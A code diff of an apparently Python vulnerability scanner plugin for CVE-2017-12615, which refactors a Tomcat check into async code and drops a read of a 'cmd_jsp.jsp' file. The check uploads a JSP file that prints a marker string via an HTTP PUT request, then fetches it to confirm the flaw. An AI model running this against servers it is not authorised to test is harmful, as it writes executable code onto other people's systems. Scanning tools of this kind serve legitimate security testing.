@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2017_12615_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class CVE_2017_12615_BaseVerify:
         }
         self.check_payload = '''<%out.print("{check}");%>'''.format(check = self.capta)
     
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -33,17 +33,13 @@ class CVE_2017_12615_BaseVerify:
         """
         
         try:
-            with open('app/static/cmd_jsp.jsp', 'r', encoding = 'utf-8') as reader:
-                jsp_data = reader.read()
-            check_req = request.put(self.url + "/%s.jsp/" %(self.capta), data = self.check_payload, headers = self.headers)
-            get_check_req = request.get(self.url + "/%s.jsp" %(self.capta), headers = self.headers)
-            if get_check_req.status_code == 200 and self.capta in get_check_req.text.strip():
+            check_req = await request.put(self.url + "/%s.jsp/" %(self.capta), data = self.check_payload, headers = self.headers)
+            get_check_req = await request.get(self.url + "/%s.jsp" %(self.capta), headers = self.headers)
+            get_check_req_result = await get_check_req.text()
+            if get_check_req.status == 200 and self.capta in get_check_req_result.strip():
                 return True
-            else:  
-                return False
         except Exception as e:
-            return False
-        finally:
+            # print(e)
             pass
         
 if  __name__ == "__main__":
